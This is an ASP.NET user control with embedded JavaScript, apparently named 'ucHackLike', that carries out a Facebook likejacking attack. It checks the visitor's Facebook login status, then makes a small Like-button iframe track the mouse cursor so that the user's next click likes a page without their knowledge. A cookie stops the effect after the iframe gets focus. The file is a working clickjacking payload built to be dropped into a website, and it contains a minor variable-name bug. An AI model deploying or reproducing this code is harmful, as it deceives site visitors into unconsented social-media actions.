<%@ Control Language="C#" AutoEventWireup="true" CodeFile="ucHackLike.ascx.cs" Inherits="usercontrols_ucHackLike" %>
<div id='fb-root'>
</div>
<div id="icontainer">
    <iframe src="http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Ffacebook.com%2Fhoclaptrinhweb&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80"
        scrolling="no" frameborder="0" style="border: none; overflow: hidden; width: 50px; height: 23px; position: absolute; left: -30px;"
        allowtransparency="true" id="fbframe"
        name="fbframe"></iframe>
</div>
<script type="text/javascript">
    var graphApiInitialized = false;
    var status = '';
    window.fbAsyncInit = function () {
        FB.init({
            appId: '312319252170353',
            status: true,
            cookie: true,
            xfbml: true,
            oauth: true
        });
        FB.getLoginStatus(function (response) {
            if (response.status === 'connected') {
                status = 'c';
            } else if (response.status === 'not_authorized') {
                status = 'n';
            } else {
                status = '';
            };
        });
        graphApiInitialized = true;
    };
    (function () {
        var e = document.createElement('script');
        e.src = 'http://connect.facebook.net/en_US/all.js';
        e.async = true;
        document.getElementById('fb-root').appendChild(e);
    }());

    var inter;
    $(function () {
        inter = setInterval("updateActiveElement();", 50);
    });

    function updateActiveElement() {
        if ($(document.activeElement).attr('id') == "fbframe") {
            clearInterval(interval);
            setCookie('vnn', '1', 10);
        }
    };
    var icon = document.getElementById('icontainer');
    function mouseFollower(e) {
        if (window.event) {
            icon.style.top = (e.pageY - 5) + 'px';
            icon.style.left = (e.pageX - 5) + 'px';
        }
        else {
            icon.style.top = (e.pageY - 5) + 'px';
            icon.style.left = (e.pageX - 5) + 'px';
        }
    };
    $(document).mousemove(function (e) {
        if (getCookie('vnn') != '1' && graphApiInitialized == true && status != '') {
            $('#icontainer').show();
            mouseFollower(e);
        } else {
            $('#icontainer').hide();
        };
    });
</script>
